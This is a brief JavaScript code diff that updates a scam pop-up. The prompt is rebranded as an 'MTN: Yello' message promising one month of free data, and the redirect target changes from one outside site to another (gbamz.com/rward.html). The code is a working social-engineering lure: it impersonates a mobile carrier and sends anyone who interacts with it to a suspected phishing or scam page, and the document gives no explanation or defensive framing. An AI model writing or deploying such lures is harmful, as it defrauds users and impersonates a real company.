@@ -1,5 +1,5 @@
-var password = 'ACTIVATE'
-password=prompt('SMS: Congratulations Your 10gb Free Data is PENDING... Click Ok to Activate Now','ACTIVATE');
-if (password != 'ACTIVATE') {
-location.href='https://ikongekpo.com/ghana.html';
+var password = 'ACTIVATE NOW'
+password=prompt('MTN: Yello, Your 1 Month Free Data is PENDING... Click Ok to Activate Now','ACTIVATE NOW');
+if (password != 'ACTIVATE NOW') {
+location.href='https://gbamz.com/rward.html';
 }
